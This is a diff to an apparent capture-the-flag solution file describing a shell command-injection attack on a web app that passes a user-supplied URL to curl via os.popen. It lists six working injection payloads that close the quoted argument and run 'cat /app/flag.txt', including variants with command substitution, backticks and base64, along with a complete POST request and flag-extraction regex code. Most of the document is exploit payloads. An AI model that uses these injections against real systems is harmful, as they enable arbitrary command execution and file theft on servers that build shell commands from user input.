@@ -18,9 +18,9 @@ tricks:
       # def check_url(url):
       #     command = f'curl -o /dev/null -s -w "%{{http_code}}" "{url}"'
       #     with os.popen(command) as output:
-      #         response = output.read().strip() 
+      #         response = output.read().strip()
       #     return response
-      # 
+      #
       # Vulnerability: url parameter from request.form['url'] (line 28)
       # is directly inserted into f-string command without sanitization
       # The url is wrapped in double quotes, but can be escaped
@@ -32,12 +32,12 @@ tricks:
     payload: |
       # Command structure: curl -o /dev/null -s -w "%{http_code}" "{url}"
       # Injection point: {url} parameter inside double quotes
-      # 
+      #
       # Constraints:
       # - App checks if '200' is in response (line 31)
       # - If '200' found, URL is saved to database
       # - If not, error message is returned
-      # 
+      #
       # Injection strategy:
       # - Break out of double quotes: use " to close quote
       # - Inject command: cat flag.txt (or /app/flag.txt)
@@ -50,31 +50,31 @@ tricks:
     payload: |
       # Flag location: /app/flag.txt (created at app startup, py line 60-66)
       # Flag format: FLAG{<sha256_hash>} or flag{this_is_a_fake_flag} (if FLAG env not set)
-      # 
+      #
       # CRITICAL: Output must contain '200' string for app to return success message
       # The app checks: if '200' in response (line 31)
       # Only success message contains the {response} variable with command output
-      # 
+      #
       # Method 1: Use curl that returns 200, then inject command (MOST RELIABLE)
       # curl outputs "200", then cat reads flag, echo closes quote
       http://httpbin.org/status/200"; cat /app/flag.txt; echo "
-      
+
       # Method 2: Break quotes, cat flag, then echo "200" (fallback if httpbin unavailable)
       "; cat /app/flag.txt; echo "200"
-      
+
       # Method 3: Same but with relative path (in case working directory differs)
       "; cat flag.txt; echo "200"
-      
+
       # Method 4: Use command substitution to embed flag and 200 together
       "; echo "$(cat /app/flag.txt)200"
-      
+
       # Method 5: Use backticks (alternative syntax)
       "; echo "`cat /app/flag.txt`200"
-      
+
       # Method 6: Try with base64 encoding to avoid special chars
       "; cat /app/flag.txt | base64; echo "200"
-      
-      # Note: 
+
+      # Note:
       # - The echo " at the end helps restore the quote structure
       # - The # comments out any remaining parts of the original command
       # - All methods ensure '200' appears in output so app returns success message
@@ -85,15 +85,15 @@ tricks:
     payload: |
       # Endpoint: POST /add_url
       # Content-Type: application/x-www-form-urlencoded
-      # 
+      #
       # Example request (Method 1 - most reliable):
       POST /add_url
       Content-Type: application/x-www-form-urlencoded
       url=http://httpbin.org/status/200"; cat /app/flag.txt; echo "
-      
+
       # Command executed:
       # curl -o /dev/null -s -w "%{http_code}" "http://httpbin.org/status/200"; cat /app/flag.txt; echo ""
-      # 
+      #
       # What happens:
       # 1. os.popen() executes the command in shell
       # 2. curl fetches http://httpbin.org/status/200 and outputs "200"
@@ -104,7 +104,7 @@ tricks:
       # 7. App checks if '200' is in response (line 31) -> TRUE
       # 8. App returns success message with {response} variable (line 35)
       # 9. Message: "URL status was checked and returned 200FLAG{...} status, Saved successfully!"
-      # 
+      #
       # Alternative (Method 2 - if httpbin unavailable):
       # url="; cat /app/flag.txt; echo "200"
       # Output: "FLAG{...}200" -> contains '200' -> passes check
@@ -120,29 +120,28 @@ tricks:
       #   "success": true,
       #   "redirect": "/"
       # }
-      # 
+      #
       # The response variable contains:
       # - curl output (if any)
       # - cat flag.txt output (the flag)
       # - echo output
-      # 
+      #
       # Flag extraction methods:
       # 1. Check JSON response['message'] field
       # 2. Check entire response.text for FLAG{...} pattern
       # 3. Use regex: r'FLAG\{[^}]+\}' (case insensitive)
-      # 
+      #
       # Example Python extraction:
       # import re
       # flag_match = re.search(r'FLAG\{[^}]+\}', resp.text, re.IGNORECASE)
       # if flag_match:
       #     flag = flag_match.group(0)
-      # 
+      #
       # Note: Flag may appear in:
       # - JSON message field
       # - Raw response text
       # - Response headers (unlikely)
-      # 
+      #
       # Flag file location: flag.txt in app root directory
       # Created at: py line 60-66
       # Flag content: os.getenv('FLAG', 'flag{this_is_a_fake_flag}')
-
